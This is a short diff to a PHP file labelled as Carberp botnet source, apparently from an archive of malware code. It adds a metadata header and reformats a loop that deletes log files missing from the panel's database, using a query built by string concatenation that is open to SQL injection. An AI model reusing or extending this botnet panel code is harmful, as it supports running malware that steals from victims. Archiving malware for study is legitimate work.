@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 ini_set('max_execution_time', 0);
@@ -29,10 +40,13 @@ function list_dir($s){
 
 list_dir($dir . '/logs');
 
-foreach($files as $key => $file){	$fz = str_replace($dir . '/logs', '', $file);
+foreach($files as $key => $file){
+	$fz = str_replace($dir . '/logs', '', $file);
 	$f = $mysqli->query('SELECT id,file,size FROM bf_files WHERE (file = \''.$fz.'\') LIMIT 1');
-	if($f->file == $fz){		unset($files[$key]);
-	}else{		@unlink($file);
+	if($f->file == $fz){
+		unset($files[$key]);
+	}else{
+		@unlink($file);
 	}
 }
 
